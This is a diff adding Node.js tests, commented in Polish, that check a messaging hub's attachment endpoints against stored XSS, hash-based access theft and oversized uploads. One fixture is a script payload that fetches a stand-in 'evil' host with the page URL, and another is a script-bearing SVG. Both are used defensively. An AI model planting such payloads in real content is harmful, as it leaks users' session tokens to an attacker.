@@ -1,6 +1,7 @@
 const { test, before, after } = require('node:test');
 const assert = require('node:assert/strict');
 const { spawn } = require('node:child_process');
+const http = require('node:http');
 const fs = require('node:fs');
 const os = require('node:os');
 const path = require('node:path');
@@ -453,4 +454,196 @@ test('blob przez Funnel (X-Forwarded-For) przechodzi — matcher stoi przed guar
   // Assert
   assert.equal(res.status, 200, 'guard XFF nie może zabić publicznego endpointu binarnego');
   assert.equal((await res.json()).sha256, sha);
+});
+
+test('GET blob: mime od nadawcy nie steruje renderem — octet-stream + nosniff + attachment', async () => {
+  // Arrange — nadawca deklaruje text/html z treścią wykonywalną w przeglądarce
+  const sender = await createMember('MimeNadawca');
+  const receiver = await createMember('MimeOdbiorca');
+  const bytes = Buffer.from('<script>fetch("https://evil/"+location.href)</script>');
+  const sha = sha256Hex(bytes);
+  assert.equal((await fetch(blobUrl(sender.token, sha), { method: 'PUT', body: bytes })).status, 200);
+  await sendWithAttachment(sender.token, 'MimeOdbiorca', {
+    filename: 'zlosliwy.html',
+    size_bytes: bytes.length,
+    mime: 'text/html',
+    sha256: sha,
+  });
+
+  // Act
+  const res = await fetch(blobUrl(receiver.token, sha));
+
+  // Assert — skrypt nie wykona się na origin huba (a token ofiary siedzi w tym URL-u)
+  assert.equal(res.status, 200);
+  assert.equal(res.headers.get('content-type'), 'application/octet-stream');
+  assert.equal(res.headers.get('x-content-type-options'), 'nosniff');
+  assert.equal(res.headers.get('content-disposition'), 'attachment');
+});
+
+test('GET blob: image/svg+xml też schodzi do octet-stream (SVG wykonuje skrypt)', async () => {
+  // Arrange
+  const sender = await createMember('SvgNadawca');
+  const receiver = await createMember('SvgOdbiorca');
+  const bytes = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>');
+  const sha = sha256Hex(bytes);
+  assert.equal((await fetch(blobUrl(sender.token, sha), { method: 'PUT', body: bytes })).status, 200);
+  await sendWithAttachment(sender.token, 'SvgOdbiorca', {
+    filename: 'obrazek.svg',
+    size_bytes: bytes.length,
+    mime: 'image/svg+xml',
+    sha256: sha,
+  });
+
+  // Act
+  const res = await fetch(blobUrl(receiver.token, sha));
+
+  // Assert
+  assert.equal(res.status, 200);
+  assert.equal(res.headers.get('content-type'), 'application/octet-stream');
+  assert.equal(res.headers.get('x-content-type-options'), 'nosniff');
+});
+
+test('GET blob: mime z allowlisty (image/png) zostaje zachowany', async () => {
+  // Arrange
+  const sender = await createMember('PngNadawca');
+  const receiver = await createMember('PngOdbiorca');
+  const bytes = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
+  const sha = sha256Hex(bytes);
+  assert.equal((await fetch(blobUrl(sender.token, sha), { method: 'PUT', body: bytes })).status, 200);
+  await sendWithAttachment(sender.token, 'PngOdbiorca', {
+    filename: 'zrzut.png',
+    size_bytes: bytes.length,
+    mime: 'image/png',
+    sha256: sha,
+  });
+
+  // Act
+  const res = await fetch(blobUrl(receiver.token, sha));
+
+  // Assert — bezpieczny typ nie jest kaleczony, ale nadal nie renderuje się w miejscu
+  assert.equal(res.headers.get('content-type'), 'image/png');
+  assert.equal(res.headers.get('content-disposition'), 'attachment');
+});
+
+test('GET blob: metadane są, bajtów na dysku nie ma → 404 z pustym ciałem (nie 500)', async () => {
+  // Arrange — wiadomość z załącznikiem BEZ uprzedniego PUT-a bajtów (stan po retencji fazy 4)
+  const sender = await createMember('SierotaNadawca');
+  const receiver = await createMember('SierotaOdbiorca');
+  const bytes = Buffer.from('bajty, których na hubie nigdy nie było');
+  const sha = sha256Hex(bytes);
+  inboxDb.recordBlobUpload(sha, 'SierotaNadawca'); // ślad wgrania został, plik nie
+  await sendWithAttachment(sender.token, 'SierotaOdbiorca', {
+    filename: 'zgubiony.bin',
+    size_bytes: bytes.length,
+    mime: 'application/octet-stream',
+    sha256: sha,
+  });
+
+  // Act
+  const res = await fetch(blobUrl(receiver.token, sha));
+
+  // Assert
+  assert.equal(res.status, 404);
+  assert.equal(await res.text(), '');
+});
+
+test('GET blob: wiadomość sfabrykowana do samego siebie z cudzym hashem → 404', async () => {
+  // Arrange — Nadawca wgrywa poufny plik i wysyła go Adresatowi
+  const sender = await createMember('FabrNadawca');
+  await createMember('FabrOdbiorca');
+  const obcy = await createMember('FabrObcy');
+  const bytes = Buffer.from('poufna umowa');
+  const sha = sha256Hex(bytes);
+  assert.equal((await fetch(blobUrl(sender.token, sha), { method: 'PUT', body: bytes })).status, 200);
+  await sendWithAttachment(sender.token, 'FabrOdbiorca', {
+    filename: 'umowa.pdf',
+    size_bytes: bytes.length,
+    mime: 'application/pdf',
+    sha256: sha,
+  });
+
+  // Act — Obcy zna hash i pisze wiadomość SAM DO SIEBIE, wskazując cudze bajty
+  await sendWithAttachment(obcy.token, 'FabrObcy', {
+    filename: 'kradziez.pdf',
+    size_bytes: bytes.length,
+    mime: 'application/pdf',
+    sha256: sha,
+  });
+  const res = await fetch(blobUrl(obcy.token, sha));
+
+  // Assert — hash nie jest uprawnieniem, nawet z własnym wierszem wiadomości
+  assert.equal(res.status, 404);
+  assert.equal(await res.text(), '');
+});
+
+test('PUT blob: pusty upload cudzych bajtów po samym hashu NIE daje dostępu', async () => {
+  // Arrange — Nadawca wgrywa plik, Obcy zna wyłącznie hash
+  const sender = await createMember('PustyNadawca');
+  const obcy = await createMember('PustyObcy');
+  const bytes = Buffer.from('tajny załącznik do wykradzenia');
+  const sha = sha256Hex(bytes);
+  assert.equal((await fetch(blobUrl(sender.token, sha), { method: 'PUT', body: bytes })).status, 200);
+
+  // Act — Obcy PUT-uje pod tym hashem treść, której nie zna (skrót dedupu jest tylko
+  // dla tego, kto te bajty realnie wgrał)
+  const put = await fetch(blobUrl(obcy.token, sha), { method: 'PUT', body: Buffer.from('') });
+
+  // Assert — hub liczy sumę sam, więc podszywka pada na hash_mismatch
+  assert.equal(put.status, 400);
+  assert.equal((await put.json()).error, 'hash_mismatch');
+
+  // Assert — i nie zdobył uprawnienia: wiadomość do siebie samego dalej daje 404
+  await sendWithAttachment(obcy.token, 'PustyObcy', {
+    filename: 'lup.bin',
+    size_bytes: bytes.length,
+    mime: 'application/octet-stream',
+    sha256: sha,
+  });
+  assert.equal((await fetch(blobUrl(obcy.token, sha))).status, 404);
+});
+
+test('PUT blob: zadeklarowany Content-Length ponad limit → 413 bez transferu ciała', async () => {
+  // Arrange
+  const member = await createMember('BlobDeklaracja');
+  const sha = sha256Hex(Buffer.from('nieistotne'));
+
+  // Act — surowy klient http, bo fetch/undici sam przelicza Content-Length; deklarujemy
+  // 26 MB i wysyłamy 16 bajtów, więc odpowiedź może przyjść WYŁĄCZNIE z odmowy przed transferem
+  const { status, body } = await new Promise((resolve, reject) => {
+    const req = http.request(
+      {
+        host: 'localhost',
+        port: PORT,
+        method: 'PUT',
+        path: `/inbox/v1/${member.token}/blob/${sha}`,
+        headers: { 'Content-Length': String(26 * 1024 * 1024) },
+      },
+      (res) => {
+        let text = '';
+        res.on('data', (c) => (text += c));
+        res.on('end', () => resolve({ status: res.statusCode, body: text }));
+      }
+    );
+    req.on('error', reject);
+    req.write(Buffer.alloc(16));
+  });
+
+  // Assert — odmowa PRZED zapisem, kształt odpowiedzi jak z limitu strumieniowego
+  assert.equal(status, 413);
+  assert.equal(JSON.parse(body).error, 'too_large');
+  assert.equal(blobStoreFiles().filter((f) => f.endsWith('.part')).length, 0);
+});
+
+test('inbox URL: nadmiarowy segment akcji nietbinarnej nie przechodzi (404)', async () => {
+  // Arrange
+  const member = await createMember('SegmentyCzlonek');
+
+  // Act + Assert — ta sama operacja pod wieloma URL-ami maskowałaby błąd klienta
+  assert.equal((await fetch(url(`/inbox/v1/${member.token}/ping/smiec`))).status, 404);
+  const pull = await fetch(url(`/inbox/v1/${member.token}/pull/x`), {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: '{}',
+  });
+  assert.equal(pull.status, 404);
 });
